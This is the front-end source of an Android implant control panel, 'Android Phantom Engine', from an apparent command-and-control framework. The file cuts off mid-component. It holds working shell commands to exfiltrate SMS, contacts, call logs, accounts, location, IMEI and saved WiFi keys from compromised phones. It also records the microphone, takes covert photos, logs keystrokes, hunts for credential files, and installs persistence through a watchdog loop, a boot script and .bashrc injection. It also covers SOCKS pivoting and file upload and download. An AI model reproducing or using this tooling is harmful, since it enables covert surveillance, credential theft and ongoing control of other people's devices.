import { useState, useRef } from 'react'
import { useAPI, apiPost, apiFetch } from '../hooks/useAPI'
import type { Session } from '../types'
import {
  Smartphone, RefreshCw, Terminal, Wifi, Bluetooth, MessageSquare,
  Mic, Camera, Key, Shield, FolderOpen, Package, Radio, Search,
  Download, Upload, Send, Loader, Copy, CheckCheck, X,
  ChevronRight, AlertTriangle, Lock, Eye, Globe, Database,
  Zap, Activity, Info, Phone,
} from 'lucide-react'

// ─── Types ────────────────────────────────────────────────────────────────────

interface ExecResult { stdout: string; stderr: string; exit_code: number }

interface OutputEntry {
  cmd:    string
  result: string
  ok:     boolean
  ts:     number
}

interface FileInfo { name: string; is_dir: boolean; size: number; mod_time: number; mode: string }
interface LsResp   { path: string; files: FileInfo[] }

// ─── Capability definitions ────────────────────────────────────────────────

const TABS = [
  { id: 'recon',    label: '🔍 Recon',    desc: 'Device & system info' },
  { id: 'files',    label: '📁 Files',    desc: 'File system access'   },
  { id: 'comms',    label: '💬 Comms',    desc: 'SMS · Contacts · Calls'},
  { id: 'network',  label: '🌐 Network',  desc: 'WiFi · IP · Routes'   },
  { id: 'apps',     label: '📦 Apps',     desc: 'Packages & services'  },
  { id: 'persist',  label: '🔒 Persist',  desc: 'Persistence setup'    },
  { id: 'specops',  label: '⚡ Spec Ops', desc: 'Advanced capabilities' },
] as const
type TabID = typeof TABS[number]['id']

// ─── Per-tab capability definitions ───────────────────────────────────────

const CAP_RECON = [
  { icon:'📱', l:'Device Model',  c:"getprop ro.product.model && getprop ro.product.manufacturer && getprop ro.product.brand" },
  { icon:'🔑', l:'Android ID',    c:"settings get secure android_id 2>/dev/null" },
  { icon:'📟', l:'IMEI',          c:"service call iphonesubinfo 1 2>/dev/null | awk -F\"'\" '{print $2}' | tr -d '.' || echo 'no-access'" },
  { icon:'🔢', l:'Serial',        c:"getprop ro.serialno 2>/dev/null || getprop ro.boot.serialno" },
  { icon:'⚙️', l:'Build Info',   c:"getprop ro.build.version.release && getprop ro.build.version.sdk && getprop ro.build.id" },
  { icon:'🔋', l:'Battery',       c:"dumpsys battery 2>/dev/null | head -15" },
  { icon:'💾', l:'Storage',       c:"df -h /sdcard /data 2>/dev/null" },
  { icon:'🧠', l:'RAM',           c:"cat /proc/meminfo | head -8" },
  { icon:'⚡', l:'CPU',           c:"cat /proc/cpuinfo | grep -E 'Hardware|Processor|model name' | head -5" },
  { icon:'🌍', l:'Locale',        c:"getprop persist.sys.locale 2>/dev/null || getprop ro.product.locale" },
  { icon:'👤', l:'Accounts',      c:"dumpsys account 2>/dev/null | grep -E 'Account \\{|type=|name=' | head -40" },
  { icon:'📍', l:'Location',      c:"dumpsys location 2>/dev/null | grep -E 'Last Known|mLastLocation|lat|lng' | head -10" },
  { icon:'📲', l:'SIM Info',      c:"getprop gsm.operator.alpha && getprop gsm.network.type && getprop gsm.sim.state" },
  { icon:'🔒', l:'Security',      c:"getprop ro.crypto.state && getprop ro.boot.verifiedbootstate && getprop ro.boot.flash.locked" },
  { icon:'🖥️', l:'Running ID',   c:"id && whoami 2>/dev/null && hostname" },
  { icon:'📋', l:'Env Vars',      c:"env" },
]

// CAP_FILES — each entry has a browseable path (opens in file browser) OR
// a fallback command (for non-directory actions like Storage Info).
const CAP_FILES: { icon: string; l: string; path?: string; c?: string }[] = [
  { icon:'📂', l:'SD Card',       path:'/sdcard' },
  { icon:'📥', l:'Downloads',     path:'/sdcard/Download' },
  { icon:'📸', l:'DCIM',          path:'/sdcard/DCIM' },
  { icon:'📄', l:'Documents',     path:'/sdcard/Documents' },
  { icon:'💚', l:'WhatsApp',      path:'/sdcard/WhatsApp/Media' },
  { icon:'✈️', l:'Telegram',      path:'/sdcard/Telegram' },
  { icon:'🔵', l:'Signal Backup', path:'/sdcard/Signal BackUp' },
  { icon:'📱', l:'Android/Media', path:'/sdcard/Android/media' },
  { icon:'🎵', l:'Music',         path:'/sdcard/Music' },
  { icon:'🏠', l:'Home dir',      path:'~' },
  { icon:'💾', l:'Storage Info',  c:"df -h 2>/dev/null" },
]

const CAP_COMMS = [
  { icon:'📨', l:'SMS Inbox',    c:"content query --uri content://sms/inbox --projection address:body:date 2>/dev/null | head -100 || echo 'Permission denied — needs READ_SMS'" },
  { icon:'📤', l:'SMS Sent',     c:"content query --uri content://sms/sent --projection address:body:date 2>/dev/null | head -100 || echo 'Permission denied'" },
  { icon:'📩', l:'All SMS',      c:"content query --uri content://sms --projection address:body:date:type 2>/dev/null | head -150 || echo 'Permission denied'" },
  { icon:'👥', l:'Contacts',     c:"content query --uri content://contacts/phones/ --projection display_name:number 2>/dev/null | head -150 || echo 'Permission denied — needs READ_CONTACTS'" },
  { icon:'📞', l:'Call Log',     c:"content query --uri content://call_log/calls --projection number:date:type:duration 2>/dev/null | head -80 || echo 'Permission denied — needs READ_CALL_LOG'" },
  { icon:'📬', l:'MMS',          c:"content query --uri content://mms --projection date:msg_box 2>/dev/null | head -50 || echo 'Permission denied'" },
  { icon:'📋', l:'Clipboard',    c:"termux-clipboard-get 2>/dev/null || echo 'Install Termux:API for clipboard access'" },
]

const CAP_NETWORK = [
  { icon:'📶', l:'WiFi Info',     c:"dumpsys wifi 2>/dev/null | grep -E 'mWifiInfo|SSID|IP address|DNS|bssid|rssi' | head -30 || ip addr" },
  { icon:'📡', l:'Saved Networks',c:"dumpsys wifi 2>/dev/null | grep -E 'WifiConfiguration|SSID|preSharedKey' | head -60 || echo 'No access'" },
  { icon:'🌐', l:'IP Addresses',  c:"ip addr show 2>/dev/null" },
  { icon:'🛣️', l:'Routes',        c:"ip route 2>/dev/null || route 2>/dev/null" },
  { icon:'🔌', l:'DNS',           c:"getprop net.dns1; getprop net.dns2; getprop net.dns3" },
  { icon:'🔗', l:'Connections',   c:"cat /proc/net/tcp6 2>/dev/null | head -30" },
  { icon:'🏠', l:'Hosts File',    c:"cat /etc/hosts 2>/dev/null || cat /system/etc/hosts 2>/dev/null" },
  { icon:'📊', l:'Network Stats', c:"cat /proc/net/dev 2>/dev/null" },
]

const CAP_APPS = [
  { icon:'📦', l:'User Apps',     c:"pm list packages -3 2>/dev/null" },
  { icon:'⚙️', l:'System Apps',  c:"pm list packages -s 2>/dev/null | head -60" },
  { icon:'📂', l:'App Paths',     c:"pm list packages -f -3 2>/dev/null | head -40" },
  { icon:'🔄', l:'Running Svcs',  c:"dumpsys activity services 2>/dev/null | grep -E '^  \\*|ServiceRecord' | head -40" },
  { icon:'🕐', l:'Recent Apps',   c:"dumpsys activity recents 2>/dev/null | grep -E 'Recent #|baseIntent' | head -30" },
  { icon:'🔐', l:'Permissions',   c:"dumpsys package 2>/dev/null | grep 'uses-permission' | sort -u | head -60" },
  { icon:'🏃', l:'Processes',     c:"ps -A 2>/dev/null | head -60 || cat /proc/*/cmdline 2>/dev/null | tr '\\0' ' ' | head -40" },
]

function fmtBytes(b: number) {
  if (b >= 1 << 20) return `${(b / (1 << 20)).toFixed(1)} MB`
  if (b >= 1024)    return `${(b / 1024).toFixed(1)} KB`
  return `${b} B`
}

// ─── Component ────────────────────────────────────────────────────────────────

interface Props { onOpenTerminal: (id: string, name: string) => void }

export default function Android({ onOpenTerminal }: Props) {
  const { data, loading, error, refresh } = useAPI<Session[]>('/api/sessions', 6_000)
  const androidSessions = (data ?? []).filter(s =>
    s.os?.toLowerCase().includes('android') || s.arch?.toLowerCase().includes('arm')
  )

  // ── Panel state ──────────────────────────────────────────────────────────
  const [selectedId,  setSelectedId]  = useState<string | null>(null)
  const [activeTab,   setActiveTab]   = useState<TabID>('recon')
  const [executing,   setExecuting]   = useState(false)
  const [outputs,     setOutputs]     = useState<OutputEntry[]>([])
  const [customCmd,   setCustomCmd]   = useState('')
  const [copied,      setCopied]      = useState(false)

  // File browser
  const [fsPath,      setFsPath]      = useState('/sdcard')
  const [fsData,      setFsData]      = useState<LsResp | null>(null)
  const [fsLoading,   setFsLoading]   = useState(false)

  // Upload
  const uploadRef = useRef<HTMLInputElement>(null)
  const [uploading,   setUploading]   = useState(false)
  const [uploadMsg,   setUploadMsg]   = useState<string | null>(null)

  const selected = androidSessions.find(s => s.id === selectedId) ?? null

  // ── Execution helper ─────────────────────────────────────────────────────
  async function exec(cmd: string, label?: string) {
    if (!selectedId) return
    setExecuting(true)
    try {
      const res = await apiPost<ExecResult>(`/api/sessions/${selectedId}/execute`, { command: cmd })
      const out = res.stdout || res.stderr || '(no output)'
      setOutputs(prev => [
        { cmd: label ?? cmd.slice(0, 60), result: out.slice(0, 3000), ok: res.exit_code === 0, ts: Date.now() },
        ...prev.slice(0, 19)
      ])
    } catch (e) {
      setOutputs(prev => [
        { cmd: label ?? cmd.slice(0, 60), result: String(e), ok: false, ts: Date.now() },
        ...prev.slice(0, 19)
      ])
    } finally { setExecuting(false) }
  }

  // ── File browser ─────────────────────────────────────────────────────────
  async function browseFs(path: string) {
    if (!selectedId) return
    setFsLoading(true)
    try {
      const ls = await apiFetch<LsResp>(`/api/sessions/${selectedId}/ls?path=${encodeURIComponent(path)}`)
      setFsPath(ls.path)
      setFsData(ls)
      setActiveTab('files')
    } catch (e) { exec(`ls -la "${path}"`, `ls ${path}`) }
    finally { setFsLoading(false) }
  }

  // ── File download ─────────────────────────────────────────────────────────
  function downloadFile(path: string) {
    if (!selectedId) return
    window.open(`/api/sessions/${selectedId}/download?path=${encodeURIComponent(path)}`, '_blank')
  }

  // ── File upload ───────────────────────────────────────────────────────────
  async function uploadFile(file: File) {
    if (!selectedId) return
    setUploading(true); setUploadMsg(null)
    const form = new FormData()
    form.append('file', file)
    form.append('path', fsPath + '/' + file.name)
    try {
      const res = await fetch(`/api/sessions/${selectedId}/upload`, { method: 'POST', body: form })
      if (!res.ok) throw new Error(await res.text())
      const j = await res.json() as { path: string }
      setUploadMsg(`✓ Uploaded → ${j.path}`)
      browseFs(fsPath)
    } catch (e) { setUploadMsg(`✗ ${String(e)}`) }
    finally { setUploading(false) }
  }

  // ── Spec Ops actions ──────────────────────────────────────────────────────
  const SPEC_OPS = [
    {
      icon: <Wifi size={14} className="text-primary" />,
      label: 'WiFi Pivot',
      color: 'border-primary/40 hover:bg-primary/10',
      labelColor: 'text-primary',
      desc: 'Route your traffic through the target Android device',
      action: () => {
        exec(
          "ip addr show | grep 'inet ' | awk '{print $2}' && cat /proc/net/arp | head -5",
          'WiFi Pivot - network info'
        )
        setOutputs(prev => [{
          cmd: 'WiFi Pivot — Setup Instructions',
          result: '─── WiFi Pivot Setup ──────────────────────────────────────\n' +
                  '1. From server console, run:\n' +
                  `   sudosoc > use ${selected?.id ?? '<session-id>'}\n` +
                  `   sudosoc (${selected?.name ?? 'device'}) > socks5 start --host 127.0.0.1 --port 1080\n\n` +
                  '2. Configure your tool to use SOCKS5 proxy:\n' +
                  '   Host: 127.0.0.1   Port: 1080\n\n' +
                  '3. All traffic routes through the Android device\'s network.\n' +
                  '─────────────────────────────────────────────────────────',
          ok: true, ts: Date.now()
        }, ...prev.slice(0, 19)])
      },
    },
    {
      icon: <Bluetooth size={14} className="text-accent" />,
      label: 'BLE C2',
      color: 'border-accent/40 hover:bg-accent/10',
      labelColor: 'text-accent',
      desc: 'Bluetooth LE covert channel — generate new implant with BLE transport',
      action: () => {
        setOutputs(prev => [{
          cmd: 'BLE C2 — Info',
          result: '─── BLE C2 Channel ────────────────────────────────────────\n' +
                  'BLE C2 is a C2 TRANSPORT for generating new implants.\n' +
                  'It is not a command that runs on an existing session.\n\n' +
                  'To use BLE C2:\n' +
                  '  → Go to Generate tab\n' +
                  '  → Select Android → BLE C2 as channel\n' +
                  '  → Deploy new implant with BLE transport\n\n' +
                  'Requirements: Android device with BLE support + C2 server\n' +
                  'with BLE peripheral setup.\n' +
                  '─────────────────────────────────────────────────────────',
          ok: true, ts: Date.now()
        }, ...prev.slice(0, 19)])
      },
    },
    {
      icon: <MessageSquare size={14} className="text-warn" />,
      label: 'SMS C2',
      color: 'border-warn/40 hover:bg-warn/10',
      labelColor: 'text-warn',
      desc: 'Read SMS + send SMS via content provider',
      action: () => exec(
        "content query --uri content://sms/inbox --projection address:body:date 2>/dev/null | head -80 || echo 'Permission denied — needs READ_SMS permission'",
        'SMS C2 - Read Inbox'
      ),
    },
    {
      icon: <Mic size={14} className="text-danger" />,
      label: 'Audio Capture',
      color: 'border-danger/40 hover:bg-danger/10',
      labelColor: 'text-danger',
      desc: 'Record microphone via Termux:API',
      action: () => exec(
        "termux-microphone-record -l 15 -f /sdcard/Download/rec_$(date +%s).m4a 2>/dev/null && echo 'Recording 15s → /sdcard/Download/' || echo 'Install Termux:API app from F-Droid for microphone access'",
        'Audio Capture (15s)'
      ),
    },
    {
      icon: <Camera size={14} className="text-purple" />,
      label: 'Camera',
      color: 'border-purple/40 hover:bg-purple/10',
      labelColor: 'text-purple',
      desc: 'Take photo via Termux:API or screencap',
      action: () => exec(
        "termux-camera-photo /sdcard/Download/photo_$(date +%s).jpg 2>/dev/null && echo 'Photo saved → /sdcard/Download/' || screencap -p /sdcard/Download/screen_$(date +%s).png 2>/dev/null && echo 'Screenshot saved → /sdcard/Download/' || echo 'Install Termux:API for camera, or run as root for screencap'",
        'Camera / Screenshot'
      ),
    },
    {
      icon: <Key size={14} className="text-warn" />,
      label: 'Keylogger',
      color: 'border-warn/40 hover:bg-warn/10',
      labelColor: 'text-warn',
      desc: 'Monitor input events (limited without root)',
      action: () => exec(
        "getevent -l 2>/dev/null | grep KEY | head -30 || cat /dev/input/event* 2>/dev/null | head -20 || echo 'Root required for full keylogger. Termux input only: check ~/.bash_history'",
        'Keylogger'
      ),
    },
    {
      icon: <Phone size={14} className="text-primary" />,
      label: 'Call Intercept',
      color: 'border-primary/40 hover:bg-primary/10',
      labelColor: 'text-primary',
      desc: 'View call logs + listen via mic (needs Termux:API)',
      action: () => exec(
        "content query --uri content://call_log/calls --projection number:date:type:duration 2>/dev/null | head -80 || echo 'Needs READ_CALL_LOG permission'",
        'Call Log'
      ),
    },
    {
      icon: <Eye size={14} className="text-accent" />,
      label: 'Stealthy Recon',
      color: 'border-accent/40 hover:bg-accent/10',
      labelColor: 'text-accent',
      desc: 'Full device fingerprint in one command',
      action: () => exec(
        "echo '=== DEVICE ===' && getprop ro.product.model && getprop ro.product.manufacturer && getprop ro.build.version.release && echo '=== NETWORK ===' && ip addr show | grep 'inet ' && echo '=== ACCOUNTS ===' && dumpsys account 2>/dev/null | grep 'Account {' | head -10 && echo '=== APPS ===' && pm list packages -3 2>/dev/null | wc -l && echo 'user apps installed' && echo '=== STORAGE ===' && df -h /sdcard 2>/dev/null",
        'Full Device Fingerprint'
      ),
    },
    {
      icon: <Database size={14} className="text-primary" />,
      label: 'Harvest Creds',
      color: 'border-primary/40 hover:bg-primary/10',
      labelColor: 'text-primary',
      desc: 'Extract stored credentials & tokens',
      action: () => exec(
        "find /sdcard -name '*.json' -o -name '*.db' -o -name '*.conf' 2>/dev/null | grep -iE 'auth|token|cred|pass|key|secret' | head -30 && find ~ -name '*.json' 2>/dev/null | grep -iE 'auth|token|cred' | head -10",
        'Credential Files'
      ),
    },
  ]

  // ── Persistence actions ───────────────────────────────────────────────────
  const PERSIST_ACTIONS = [
    {
      label: '1️⃣ Watchdog Restart Loop',
      desc: 'Auto-restart the implant every 15s if it gets killed',
      cmd:  "nohup sh -c 'while true; do ~/phantom 2>/dev/null; sleep 15; done' > /dev/null 2>&1 & echo '[+] Watchdog running — implant auto-restarts if killed'",
      btnLabel: 'Start Watchdog',
    },
    {
      label: '2️⃣ Termux:Boot (يشتغل مع فتح Termux)',
      desc: 'Installs boot script — requires Termux:Boot app from F-Droid',
      cmd:  "mkdir -p ~/.termux/boot && printf '#!/data/data/com.termux/files/usr/bin/sh\\nnohup ~/phantom > /dev/null 2>&1 &\\n' > ~/.termux/boot/phantom.sh && chmod +x ~/.termux/boot/phantom.sh && echo '[+] Boot script: ~/.termux/boot/phantom.sh'",
      btnLabel: 'Install Boot Script',
    },
    {
      label: '3️⃣ .bashrc Injection',
      desc: 'Starts implant on every new Termux terminal session',
      cmd:  "grep -q phantom ~/.bashrc 2>/dev/null || echo 'nohup ~/phantom > /dev/null 2>&1 &' >> ~/.bashrc && echo '[+] Added to ~/.bashrc'",
      btnLabel: 'Inject .bashrc',
    },
    {
      label: '🔍 Check Persistence',
      desc: 'Verify all persistence mechanisms are active',
      cmd:  "echo '=== Running ===' && ps aux 2>/dev/null | grep phantom | grep -v grep || echo 'not running' && echo '=== Boot ===' && cat ~/.termux/boot/phantom.sh 2>/dev/null || echo 'no boot script' && echo '=== .bashrc ===' && grep phantom ~/.bashrc 2>/dev/null || echo 'not in .bashrc'",
      btnLabel: 'Check Status',
    },
    {
      label: '🗑️ Remove All Persistence',
      desc: 'Clean up all persistence mechanisms',
      cmd:  "pkill -f phantom 2>/dev/null; rm -f ~/.termux/boot/phantom.sh; sed -i '/phantom/d' ~/.bashrc 2>/dev/null; echo '[+] Persistence removed'",
      btnLabel: 'Remove All',
    },
  ]

  const lastOutput = outputs[0] ?? null

  return (
    <div className="flex flex-col gap-0 h-full">

      {/* ── Header bar ────────────────────────────────────────────────── */}
      <div className="flex items-center justify-between mb-3 shrink-0">
        <div>
          <h2 className="text-primary font-bold text-lg flex items-center gap-2">
            <Smartphone size={18} /> Android Phantom Engine
            <span className="text-muted text-sm font-normal">
              ({androidSessions.length} device{androidSessions.length !== 1 ? 's' : ''})
            </span>
          </h2>
          <p className="text-muted text-xs mt-0.5">Right-click any session in the Network Map for quick actions</p>
        </div>
        <button onClick={refresh}
          className="flex items-center gap-1 text-muted hover:text-text text-xs px-2 py-1 rounded border border-border">
          <RefreshCw size={12} /> Refresh
        </button>
      </div>

      {error && <div className="text-danger text-xs bg-danger/10 border border-danger/30 rounded p-2 mb-2">{error}</div>}

      {/* ── Two-panel layout ────────────────────────────────────────────── */}
      <div className="flex gap-3 flex-1 min-h-0">

        {/* ── LEFT: Device list ────────────────────────────────────────── */}
        <div className="w-52 shrink-0 flex flex-col gap-1">
          <div className="text-[9px] text-muted uppercase tracking-widest mb-1 px-1">Devices</div>

          {loading && androidSessions.length === 0 && (
            <div className="text-muted text-xs flex items-center gap-1 px-2">
              <Loader size={10} className="animate-spin" /> Loading…
            </div>
          )}

          {androidSessions.length === 0 && !loading ? (
            <div className="bg-surface border border-border rounded-lg p-3 text-center">
              <Smartphone size={24} className="text-border mx-auto mb-2" />
              <p className="text-muted text-[10px]">No Android devices</p>
              <p className="text-muted text-[9px] mt-1">Deploy an implant first</p>
            </div>
          ) : (
            androidSessions.map(s => (
              <button key={s.id}
                onClick={() => { setSelectedId(s.id); setOutputs([]) }}
                className={`w-full text-left rounded-lg border p-2.5 transition-all ${
                  selectedId === s.id
                    ? 'border-primary bg-primary/10'
                    : 'border-border bg-surface hover:border-primary/40'
                }`}>
                <div className="flex items-center gap-2">
                  <span className={`w-1.5 h-1.5 rounded-full shrink-0 ${s.is_dead ? 'bg-danger' : 'bg-primary animate-pulse'}`} />
                  <span className={`text-xs font-bold truncate ${selectedId === s.id ? 'text-primary' : 'text-text'}`}>
                    {s.name}
                  </span>
                  {selectedId === s.id && <ChevronRight size={10} className="text-primary ml-auto shrink-0" />}
                </div>
                <div className="text-[9px] text-muted mt-1 truncate pl-3.5">{s.os}/{s.arch}</div>
                <div className="text-[9px] text-muted truncate pl-3.5">{s.username}@{s.hostname}</div>
                <div className="text-[9px] text-muted truncate pl-3.5">{s.remote_address}</div>
              </button>
            ))
          )}

          {/* ── Quick session stats ─────────────────────────────────── */}
          {selected && (
            <div className="mt-auto pt-2 border-t border-border flex flex-col gap-1">
              <button onClick={() => onOpenTerminal(selected.id, selected.name)}
                className="w-full flex items-center justify-center gap-1.5 py-1.5 rounded border border-primary/40 text-primary hover:bg-primary/10 transition-colors text-[11px]">
                <Terminal size={11} /> Open Shell
              </button>
              <button onClick={() => browseFs('/sdcard')}
                className="w-full flex items-center justify-center gap-1.5 py-1.5 rounded border border-warn/40 text-warn hover:bg-warn/10 transition-colors text-[11px]">
                <FolderOpen size={11} /> Browse Files
              </button>
            </div>
          )}
        </div>

        {/* ── RIGHT: Device panel ──────────────────────────────────────── */}
        {!selected ? (
          <div className="flex-1 flex items-center justify-center text-center border border-dashed border-border rounded-lg">
            <div>
              <Smartphone size={40} className="text-border mx-auto mb-3" />
              <p className="text-muted text-sm">Select a device from the left</p>
              <p className="text-muted text-xs mt-1">or generate an implant via the Generate tab</p>
            </div>
          </div>
        ) : (
          <div className="flex-1 flex flex-col gap-2 min-h-0 min-w-0">

            {/* ── Device info bar ───────────────────────────────────── */}
            <div className="bg-surface border border-primary/20 rounded-lg px-3 py-2 shrink-0">
              <div className="flex items-center gap-2 flex-wrap">
                <span className="w-2 h-2 rounded-full bg-primary animate-pulse shrink-0" />
                <span className="text-primary font-bold text-sm">{selected.name}</span>
                <span className="text-muted text-[10px] font-mono">{selected.id.slice(0,8)}</span>
                <span className="text-muted text-[10px] bg-border/40 px-1.5 py-0.5 rounded">{selected.os}/{selected.arch}</span>
                <span className="text-muted text-[10px] bg-border/40 px-1.5 py-0.5 rounded">{selected.transport}</span>
                <span className="text-muted text-[10px] ml-auto">PID {selected.pid} · {selected.remote_address}</span>
              </div>
            </div>

            {/* ── Tab bar ────────────────────────────────────────────── */}
            <div className="flex gap-0.5 overflow-x-auto shrink-0 bg-surface border border-border rounded-lg p-1">
              {TABS.map(t => (
                <button key={t.id} onClick={() => setActiveTab(t.id)}
                  title={t.desc}
                  className={`px-2.5 py-1.5 rounded text-[10px] whitespace-nowrap transition-colors ${
                    activeTab === t.id
                      ? 'bg-primary/20 text-primary font-semibold'
                      : 'text-muted hover:text-text hover:bg-border/30'
                  }`}>
                  {t.label}
                </button>
              ))}
            </div>

            {/* ── Tab content (scrollable) ────────────────────────────── */}
            <div className="flex-1 min-h-0 overflow-y-auto">

              {/* RECON tab */}
              {activeTab === 'recon' && (
                <div className="grid grid-cols-2 sm:grid-cols-3 md:grid-cols-4 gap-1.5 p-1">
                  {CAP_RECON.map(c => (
                    <button key={c.l} onClick={() => exec(c.c, c.l)} disabled={executing}
                      className="flex items-center gap-2 px-2.5 py-2 rounded border border-border bg-surface hover:border-primary/50 hover:bg-primary/5 transition-colors disabled:opacity-40 text-left">
                      <span className="text-base shrink-0">{c.icon}</span>
                      <span className="text-[10px] text-muted truncate">{c.l}</span>
                    </button>
                  ))}
                </div>
              )}

              {/* FILES tab */}
              {activeTab === 'files' && (
                <div className="flex flex-col gap-2 p-1">
                  {/* Quick access — paths open in file browser, commands show in console */}
                  <div className="grid grid-cols-2 sm:grid-cols-3 md:grid-cols-4 gap-1.5">
                    {CAP_FILES.map(c => (
                      <button key={c.l}
                        onClick={() => {
                          if (c.path) {
                            setFsPath(c.path)
                            browseFs(c.path)
                          } else if (c.c) {
                            exec(c.c, c.l)
                          }
                        }}
                        disabled={executing || fsLoading}
                        className="flex items-center gap-2 px-2.5 py-2 rounded border border-border bg-surface hover:border-warn/50 hover:bg-warn/5 transition-colors disabled:opacity-40 text-left">
                        <span className="text-base shrink-0">{c.icon}</span>
                        <span className="text-[10px] text-muted truncate">{c.l}</span>
                        {c.path && <span className="text-[8px] text-warn/50 ml-auto shrink-0">→</span>}
                      </button>
                    ))}
                  </div>

                  {/* File browser */}
                  <div className="border border-border rounded-lg overflow-hidden">
                    <div className="flex items-center gap-2 px-3 py-2 bg-surface border-b border-border">
                      <FolderOpen size={12} className="text-warn" />
                      <input value={fsPath} onChange={e => setFsPath(e.target.value)}
                        onKeyDown={e => e.key === 'Enter' && browseFs(fsPath)}
                        className="flex-1 bg-bg border border-border rounded px-2 py-1 text-[11px] font-mono text-text focus:border-warn outline-none" />
                      <button onClick={() => browseFs(fsPath)} disabled={fsLoading}
                        className="px-2 py-1 rounded bg-warn/10 border border-warn/40 text-warn text-[11px] disabled:opacity-40">
                        {fsLoading ? <Loader size={11} className="animate-spin" /> : 'Go'}
                      </button>
                      {/* Upload */}
                      <input ref={uploadRef} type="file" className="hidden"
                        onChange={e => e.target.files?.[0] && uploadFile(e.target.files[0])} />
                      <button onClick={() => uploadRef.current?.click()} disabled={uploading}
                        className="px-2 py-1 rounded bg-accent/10 border border-accent/40 text-accent text-[11px] flex items-center gap-1 disabled:opacity-40">
                        <Upload size={10} /> {uploading ? '…' : 'Upload'}
                      </button>
                    </div>

                    {uploadMsg && (
                      <div className={`px-3 py-1 text-[10px] ${uploadMsg.startsWith('✓') ? 'text-primary bg-primary/5' : 'text-danger bg-danger/5'}`}>
                        {uploadMsg}
                      </div>
                    )}

                    {fsData ? (
                      <div className="max-h-52 overflow-y-auto">
                        {fsPath !== '/' && (
                          <button onClick={() => browseFs(fsPath.split('/').slice(0, -1).join('/') || '/')}
                            className="w-full flex items-center gap-2 px-3 py-1.5 hover:bg-border/20 text-[11px] text-muted border-b border-border/30">
                            ⬆ ..
                          </button>
                        )}
                        {fsData.files.map(f => (
                          <div key={f.name}
                            className="flex items-center gap-2 px-3 py-1.5 hover:bg-border/20 border-b border-border/20">
                            <span className="text-[10px] shrink-0">{f.is_dir ? '📁' : '📄'}</span>
                            <button
                              onClick={() => f.is_dir ? browseFs(fsPath + '/' + f.name) : void 0}
                              className={`flex-1 text-[11px] font-mono text-left truncate ${f.is_dir ? 'text-warn hover:text-primary cursor-pointer' : 'text-text cursor-default'}`}>
                              {f.name}
                            </button>
                            <span className="text-[9px] text-muted shrink-0">
                              {f.is_dir ? 'dir' : fmtBytes(f.size)}
                            </span>
                            {!f.is_dir && (
                              <button
                                onClick={() => downloadFile(fsPath + '/' + f.name)}
                                title={`Download ${f.name}`}
                                className="flex items-center gap-1 px-1.5 py-0.5 rounded text-[9px] border border-primary/30 text-primary hover:bg-primary/10 transition-colors shrink-0">
                                <Download size={9} /> DL
                              </button>
                            )}
                          </div>
                        ))}
                      </div>
                    ) : (
                      <div className="p-3 text-[10px] text-muted text-center">
                        Enter a path and press Go, or click a quick-access button above
                      </div>
                    )}
                  </div>
                </div>
              )}

              {/* COMMS tab */}
              {activeTab === 'comms' && (
                <div className="flex flex-col gap-2 p-1">
                  <div className="bg-warn/5 border border-warn/20 rounded px-3 py-2 text-[10px] text-warn flex items-start gap-2">
                    <AlertTriangle size={12} className="shrink-0 mt-0.5" />
                    <span>Most communications access needs READ_SMS, READ_CONTACTS, READ_CALL_LOG permissions. Termux has these if granted at first run.</span>
                  </div>
                  <div className="grid grid-cols-2 sm:grid-cols-3 gap-1.5">
                    {CAP_COMMS.map(c => (
                      <button key={c.l} onClick={() => exec(c.c, c.l)} disabled={executing}
                        className="flex items-center gap-2 px-2.5 py-2 rounded border border-accent/30 bg-surface hover:border-accent/60 hover:bg-accent/5 transition-colors disabled:opacity-40 text-left">
                        <span className="text-base shrink-0">{c.icon}</span>
                        <span className="text-[10px] text-muted truncate">{c.l}</span>
                      </button>
                    ))}
                  </div>
                </div>
              )}

              {/* NETWORK tab */}
              {activeTab === 'network' && (
                <div className="grid grid-cols-2 sm:grid-cols-3 md:grid-cols-4 gap-1.5 p-1">
                  {CAP_NETWORK.map(c => (
                    <button key={c.l} onClick={() => exec(c.c, c.l)} disabled={executing}
                      className="flex items-center gap-2 px-2.5 py-2 rounded border border-border bg-surface hover:border-primary/50 hover:bg-primary/5 transition-colors disabled:opacity-40 text-left">
                      <span className="text-base shrink-0">{c.icon}</span>
                      <span className="text-[10px] text-muted truncate">{c.l}</span>
                    </button>
                  ))}
                </div>
              )}

              {/* APPS tab */}
              {activeTab === 'apps' && (
                <div className="grid grid-cols-2 sm:grid-cols-3 md:grid-cols-4 gap-1.5 p-1">
                  {CAP_APPS.map(c => (
                    <button key={c.l} onClick={() => exec(c.c, c.l)} disabled={executing}
                      className="flex items-center gap-2 px-2.5 py-2 rounded border border-border bg-surface hover:border-warn/50 hover:bg-warn/5 transition-colors disabled:opacity-40 text-left">
                      <span className="text-base shrink-0">{c.icon}</span>
                      <span className="text-[10px] text-muted truncate">{c.l}</span>
                    </button>
                  ))}
                </div>
              )}

              {/* PERSIST tab */}
              {activeTab === 'persist' && (
                <div className="flex flex-col gap-2 p-1">
                  {PERSIST_ACTIONS.map(pa => (
                    <div key={pa.label} className="bg-surface border border-border rounded-lg p-3 flex flex-col gap-2">
                      <div>
                        <div className="text-xs text-text font-semibold">{pa.label}</div>
                        <div className="text-[10px] text-muted mt-0.5">{pa.desc}</div>
                      </div>
                      <button onClick={() => exec(pa.cmd, pa.label)} disabled={executing}
                        className="self-start px-3 py-1.5 rounded text-[11px] border border-danger/40 text-danger hover:bg-danger/10 transition-colors disabled:opacity-40">
                        {executing ? <Loader size={10} className="animate-spin inline mr-1" /> : null}
                        {pa.btnLabel}
                      </button>
                    </div>
                  ))}
                </div>
              )}

              {/* SPEC OPS tab */}
              {activeTab === 'specops' && (
                <div className="flex flex-col gap-2 p-1">
                  <div className="bg-danger/5 border border-danger/20 rounded px-3 py-2 text-[10px] text-danger flex items-start gap-2">
                    <Zap size={12} className="shrink-0 mt-0.5" />
                    <span>Special operations. Some require Termux:API app or root access. Results shown in output console below.</span>
                  </div>
                  <div className="grid grid-cols-1 sm:grid-cols-2 md:grid-cols-3 gap-2">
                    {SPEC_OPS.map(op => (
                      <button key={op.label} onClick={op.action} disabled={executing}
                        className={`flex flex-col gap-1.5 p-3 rounded border bg-surface transition-colors text-left disabled:opacity-40 ${op.color}`}>
                        <div className="flex items-center gap-2">
                          {op.icon}
                          <span className={`text-xs font-semibold ${op.labelColor}`}>{op.label}</span>
                        </div>
                        <span className="text-[10px] text-muted">{op.desc}</span>
                      </button>
                    ))}
                  </div>
                </div>
              )}
            </div>

            {/* ── Custom command input ─────────────────────────────────── */}
            <div className="flex gap-2 shrink-0">
